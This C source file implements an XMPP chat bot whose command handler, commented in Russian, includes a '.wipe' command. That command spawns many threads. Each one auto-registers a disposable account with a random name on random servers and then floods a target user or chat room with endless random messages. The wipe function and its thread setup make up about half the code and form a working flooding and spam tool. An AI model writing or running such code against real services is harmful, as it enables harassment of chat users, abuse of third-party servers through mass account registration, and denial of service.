#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>

#include "xmpp.h"
#include "util.h"
#include "commands.h"

#define NUM_THREADS     5

struct thread_info {          /* Used as argument to thread_start() */
  GThread  *thread_id;        /* Thread's id */
  int       thread_num;       /* Application−defined thread # */
  char     *argv_string;      /* From command−line argument */
};

/* 
 * Проверка входящего сообщения 
 * на содержания тех или иных комманд
 */
void handler_cmd(LmConnection *connect, gchar *cmd, gchar *args) {
  
  if(!strcmp(cmd, ".say_to")) {
    gchar *to_jid, *text;
    to_jid = strtok(args, " ");
    text   = strtok(NULL, "");
    if(to_jid && text) {
      if(is_room(to_jid))
        room_message(connect, to_jid, text);
      else
        jid_message(connect, to_jid, text);
    }
  }

  else if(!strcmp(cmd, ".join")) {
    gchar *room, *nick;
    room = strtok(args, " ");
    nick = strtok(NULL, "");
    if(!g_hash_table_lookup(rooms, room)) {
      if(!nick)
        nick = g_strdup(g_hash_table_lookup(config, "muc_default_nick"));
      join_room(connect, room, nick);
      g_hash_table_insert(rooms, g_strdup(room), g_strdup(nick));
    }
  }

  else if(!strcmp(cmd, ".leave")) {
    gchar    *status, *room, *nick;
    room    = strtok(args, " ");
    status  = strtok(NULL, "");
    nick = g_strdup(g_hash_table_lookup(rooms, room));
    if(nick) { 
      if(!status)
        status = g_strdup(g_hash_table_lookup(config, "status"));
      if(room) { 
        leave_room(connect, room, nick, status);
        g_hash_table_remove(rooms, room);
      }
    }
    g_free(nick);
  }

  else if(!strcmp(cmd, ".quit")) {
    fprintf(stderr, "Quit..\n");
    g_hash_table_foreach(rooms, leave_all_room, connect);
    g_main_quit(main_loop);
  }

  else if(!strcmp(cmd, ".wipe")) {
    gchar   *to, *number; 
    unsigned int num_threads = NUM_THREADS;
    struct thread_info *tinfo;
    GError  *error = NULL;
    int t;

    to      = strtok(args, " ");
    number  = strtok(NULL, "");
    
    if(number) 
      num_threads = atoi(number);
    
    // Инициируем потоки Glib 
    if (!g_thread_supported()) {
      g_thread_init(NULL);
      fprintf(stderr, "Glib's thread initiated\n");
    } 

    // Создаём массив структур для потоков
    tinfo = xcalloc(num_threads, sizeof(struct thread_info));

    /* Создаём потоки и передаём 
     * каждому потоку свою структуру */
    for(t=0; t<num_threads; t++) {
      tinfo[t].thread_num = t + 1;
      tinfo[t].argv_string = strdup(to);

      fprintf(stderr, "In handler_cmd: Creating thread %d\n", t);
      tinfo[t].thread_id = g_thread_create(wipe, &tinfo[t], FALSE, &error);
      if(!tinfo[t].thread_id)
        fprintf(stderr, "Failed to create thread: %s\n", error->message);
      usleep(100000);
    }  

  }
}

/* 
 * Функция для создания потока
 */
void* wipe(void *arg) {
  struct _jid *jid = (struct _jid*)xcalloc(1, sizeof(struct _jid));
  LmConnection *new_connect;
  GMainContext  *context;
  struct thread_info *tinfo = (struct thread_info *)arg;

  gchar *to = tinfo->argv_string;
  srand((long)tinfo->thread_id);
  
  // Создаёт новый контекст внутри потока
  context = g_main_context_new();

  /* Забиваем структуру jid для 
   * регистрации и установки соединения */
  do 
    jid->username = rnd_string_from_file(NICK_LIST);
  while(!strcmp(jid->username, ""));

  do
    jid->server = rnd_string_from_file(SERV_LIST);
  while(!strcmp(jid->server, ""));
  
  strcat(jid->username, get_rnd_str());  
  
  jid->password = SIMPLE_PASS;
  jid->resource = SIMPLE_RES; 

  /* Отладка 
  dprint(jid->username);
  dprint(jid->server);
  dprint(jid->password);
  dprint(jid->resource); 
  */
 
  // Регистрация
  if(!jid_reg(jid, context)) 
    return NULL;
  
  // Соединение
  new_connect = jid_connect(jid, context);
  if(!new_connect) 
    return NULL;

  if(!to)
    return NULL;

  usleep(50000);
  
  // Вайп //
  char* s = (char*)xcalloc(500, sizeof(char));
  do
    s = rnd_string_from_file("talklist");
  while(!strcmp(s, ""));

  if(is_room(to)) {
    join_room(new_connect, to, jid->username);
    sleep(random() % 5);
  }
  
  while(1) {
    // Каждый раз новая фраза
    do
      s = rnd_string_from_file("talklist");
    while(!strcmp(s, ""));

    if(is_room(to)) {
      room_message(new_connect, to, s);
      sleep(random() % 5);
    } else {
      jid_message(new_connect, to, s);
      usleep(random() % 250000);
    }
  }

}

/* 
 * Функиция, которая выполняется для каждого 
 * эллемента хеш-таблицы rooms при окончинии работы.
 */
void leave_all_room(gpointer key, gpointer value, gpointer connect) {
  if(key && value)
    leave_room(connect, key, value, "Quit for command.");
}


